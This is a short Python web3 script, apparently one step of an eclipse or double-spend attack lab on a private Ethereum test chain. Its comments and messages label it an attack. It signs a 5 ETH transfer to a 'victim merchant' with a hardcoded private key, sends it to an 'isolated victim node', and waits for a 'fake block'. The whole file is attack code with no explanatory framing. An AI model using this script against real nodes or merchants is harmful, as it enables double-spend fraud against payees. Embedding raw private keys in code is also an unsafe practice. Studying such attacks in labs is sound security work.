#!/usr/bin/env python3
from web3 import Web3
from eth_account import Account

# Target: The Isolated Victim Node
web3 = Web3(Web3.HTTPProvider('http://10.162.0.71:8545'))

# Attacker Origin Account (10 ETH)
key = 'e128a6b87aa1d934970fd0f2714dd2fe61c017636725dbfeb5e487cc83bcb7eb'
sender = Account.from_key(key)

# The Victim Merchant
recipient = Web3.toChecksumAddress('0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9')

print(f"[*] Attacker: {sender.address}")
print(f"[*] Victim: {recipient}")

tx = {
    'chainId': 1337,
    'nonce': web3.eth.getTransactionCount(sender.address),
    'from': sender.address,
    'to': recipient,
    'value': Web3.toWei("5", 'ether'),
    'gas': 200000,
    'maxFeePerGas': Web3.toWei('4', 'gwei'),
    'maxPriorityFeePerGas': Web3.toWei('3', 'gwei'),
    'data': b''
}

print(f"[*] FAKE TX: Sending 5 ETH to Victim using Nonce {tx['nonce']}...")
signed_tx = web3.eth.account.sign_transaction(tx, sender.key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)

print(f"[+] FAKE TX IN MEMPOOL! Hash: {tx_hash.hex()}")
print("[*] Waiting for isolated Node 71 to mine the fake block...")

# Wait up to 5 minutes (300 seconds)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
print(f"[+] SUCCESS! FAKE TX CEMENTED in Fake Block {tx_receipt['blockNumber']}!")
